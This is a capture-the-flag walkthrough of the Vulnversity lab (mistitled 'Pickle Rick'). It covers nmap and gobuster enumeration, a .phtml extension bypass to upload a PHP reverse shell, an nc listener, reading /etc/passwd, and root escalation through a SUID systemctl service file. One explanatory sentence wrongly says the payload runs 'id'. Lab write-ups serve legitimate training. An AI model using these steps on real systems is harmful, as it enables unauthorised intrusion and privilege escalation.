# Pickle Rick

[TOC]

## Introduction

A machine that covers the topics of active information gathering using nmap, web enumeration with gobuster, getting a foothold into the system and escalating our privileges!

## Basic Information

Target IP: 10.10.132.56

## Reconnaissance

Let us start by performing an nmap scan on the target machine in order to know what services it is hosting.

```
nmap 10.10.132.56
```

> Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 15:40 EST
> Nmap scan report for 10.10.132.56
> Host is up (0.046s latency).
> Not shown: 994 closed tcp ports (conn-refused)
> PORT     STATE SERVICE
> 21/tcp   open  ftp
> 22/tcp   open  ssh
> 139/tcp  open  netbios-ssn
> 445/tcp  open  microsoft-ds
> 3128/tcp open  squid-http
> 3333/tcp open  dec-notes

We know the host is up and some of its open ports. Let's do a better scan and see every open port and what service and its version is being hosted by the server.

```
sudo nmap -Pn -sV -p- 10.10.132.56 -oN vulnersity_scan
```

> Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 15:11 EST
> Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
> Service scan Timing: About 33.33% done; ETC: 15:12 (0:00:12 remaining)
> Nmap scan report for 10.10.132.56
> Host is up (0.048s latency).
> Not shown: 65529 closed tcp ports (reset)
> PORT     STATE SERVICE     VERSION
> 21/tcp   open  ftp         vsftpd 3.0.3
> 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
> 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
> 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
> 3128/tcp open  http-proxy  Squid http proxy 3.5.12
> 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
> Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Great! Now we can start answering questions!

**Question**: Scan the box, how many ports are open?

> 6, self-explanatory

**Question**: What version of the squid proxy is running on the machine?

> 3.5.12, we can see theat port 3128 is running a Squid http proxy listing its version number

**Question**: How many ports will nmap scan if the flag -p-400 was used?

> 400, this scans from port 1 to 400

**Question**: Using the nmap flag -n what will it not resolve?

> DNS, the -n flag in Nmap tells it to not resolve hostnames. Without this flag, Nmap will perform a reverse DNS lookup on the IP addresses it is scanning to determine their hostnames. Using the -n flag will make Nmap skip this step and only display the IP addresses in the scan results, which can make the scan run faster.

**Question**: What is the most likely operating system this machine is running?

> Ubuntu, we can extract that information from the SSH version, SMB version, HTTP version.
>
> We could also run a scan with the -O flag set to extract this information

**Question**: What port is the web server running on?

> 3333

## Locating directories using GoBuster

We know that the target is hosting a website. Let us perform a web enumeration attack to extract useful information.

```
gobuster dir -u http://10.10.132.56:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

> Gobuster v3.4
>
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
>
> [+] Url:                     http://10.10.132.56:3333
> [+] Method:                  GET
> [+] Threads:                 10
> [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
> [+] Negative Status codes:   404
> [+] User Agent:              gobuster/3.4
>
> [+] Timeout:                 10s
>
> 2023/01/21 16:22:27 Starting gobuster in directory enumeration mode
>
> /images               (Status: 301) [Size: 320] [--> http://10.10.132.56:3333/images/]
> /css                  (Status: 301) [Size: 317] [--> http://10.10.132.56:3333/css/]
> /js                   (Status: 301) [Size: 316] [--> http://10.10.132.56:3333/js/]
> /fonts                (Status: 301) [Size: 319] [--> http://10.10.132.56:3333/fonts/]
> /internal             (Status: 301) [Size: 322] [--> http://10.10.132.56:3333/internal/]

From the output above we can see the */internal* path which may be worth exploring. If we open the web browser on this page we have access to a file upload portal.

**Question** What is the directory that has an upload form page?

> /internal

## Compromise the webserver

In order to compromise the web server the idea is to upload a reverse shell payload so that we can connect back to our local listener.

Hence, we need to:

1. Be able to upload the payload
2. Find its location so we can execute it
3. Launch a Listener a execute the payload

### Payload Extension

In order to upload a shell we need to know what programming language it is using in order for the server to be able to execute our payload. Using **Wappalyzer** we can see that PHP is what is running on the website.

We can use the [PentestMonkey's PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) for this. We have to modify the variables $ip to our kali machine's IP Address and the $port to one of our choosing, in order for this method to work.

After doing this let's try to upload the payload.

Oh no! The file extension .php is not allowed. Luckily for us there are other PHP file extensions we can try to use to make this method work.

**Question** What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out.

> .php

We can do this manually, or setup a wordlist and run Sniper Scan using BurpSuite with the different file extensions.

In our case, since the list of options is small we are going ahead and do this manually.

```
mv shell.php shell.phtml
```

After experimenting with different shell we can see that .phtml is accepted by the application.

**Question** Run this attack, what extension is allowed?

> .phtml

Great! Our shell was successfully uploaded.

### Uploaded Payload Location

In order to do this, we have to another instance of web enumeration in the */internal* path.

```
gobuster dir -u http://10.10.132.56:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

![image-20230122170912400](/home/kali/Desktop/pentest_walkthoughs/Machines/THM/Vulnversity/images/image-20230122170912400.png)

Great! We have found the */internal/uploads* path which showcases our reverse shell payload.

### Reverse Shell Execution

Now we just have to launch a local listener with:

```
nc -lnvp <port>
```

And afterwards click on the uploaded payload to launch it!

![image-20230122170716519](/home/kali/Desktop/pentest_walkthoughs/Machines/THM/Vulnversity/images/image-20230122170716519.png)

Great! We have shell, but its kind of unstable and limited so let's upgrade it using:

 `python3 -c 'import pty; pty.spawn("/bin/bash")'`

We are not done yet though, we still have to discover the name of the user that manages the webserver and the user flag.

We can cat /etc/passwd or enter the home directory to discover a user named bill:

```
cat /etc/passwd

or 

cd /home
ls
```

> bill\:x\:1000:1000:,,,:/home/bill:/bin/bash

**Question** What is the name of the user who manages the webserver?

> bill

Going inside the *home/bill* directory we have the user.txt file with the flag.

**Question** What is the user flag?

```
cat /home/bill/user.txt
```

> <Redacted>

## Privilege Escalation

We have a shell as user **www-data**, but is there a way to upgrade our privileges to root? Let's see how.

We get a hint by THM to search for all SUID files, which we can do using the command below:

```
find / -type f -perm -04000 -ls 2>/dev/null
```

>    402892     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newuidmap
>    393361     52 -rwsr-xr-x   1 root     root        49584 May 16  2017 /usr/bin/chfn
>    402893     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newgidmap
>    393585    136 -rwsr-xr-x   1 root     root       136808 Jul  4  2017 /usr/bin/sudo
>    393363     40 -rwsr-xr-x   1 root     root        40432 May 16  2017 /usr/bin/chsh
>    393501     56 -rwsr-xr-x   1 root     root        54256 May 16  2017 /usr/bin/passwd
>    406711     24 -rwsr-xr-x   1 root     root        23376 Jan 15  2019 /usr/bin/pkexec
>    393490     40 -rwsr-xr-x   1 root     root        39904 May 16  2017 /usr/bin/newgrp
>    393424     76 -rwsr-xr-x   1 root     root        75304 May 16  2017 /usr/bin/gpasswd
>    405497     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 14  2016 /usr/bin/at
>    406941    100 -rwsr-sr-x   1 root     root        98440 Jan 29  2019 /usr/lib/snapd/snap-confine
>    406710     16 -rwsr-xr-x   1 root     root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
>    405145    420 -rwsr-xr-x   1 root     root       428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
>    393687     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
>    666971     76 -rwsr-xr-x   1 root     root        76408 Jul 17  2019 /usr/lib/squid/pinger
>    402037     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
>    402829     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
>    131164     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
>    133166    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g
>    131133     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
>    131148     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
>    131182     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
>    **131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl**
>    131147     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
>    133163     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
>    405750     36 -rwsr-xr-x   1 root     root          35600 Mar  6  2017 /sbin/mount.cifs

From the output provided above we can see that the /bin/systemctl file stands out from the rest.

Alternatively we can also run a script such as LinPeas.sh to help us with this enumeration task.

The systemctl command is a utility which is responsible for examining and controlling the systemd system and service manager.

If we consult the wonderful resources which is [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#suid) we can see that this service is easily exploitable with the following commands:

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

This script creates a new systemd service file, which is a file that describes a service that can be run on a Linux system. The service is called $(mktemp).service, which means it will be a temporary file with a unique name. The service runs a single command, "cat /root/root.txt > /tmp/output", which runs the "id" command and saves its output to a file named "output" in the /tmp directory. The service is then linked to the systemd system and enabled to run automatically on startup.

Finally, we can just read the contents of the /tmp/output to solve the task:

```
cat /tmp/output
```

Congratulation completing the Vulnversity Room!
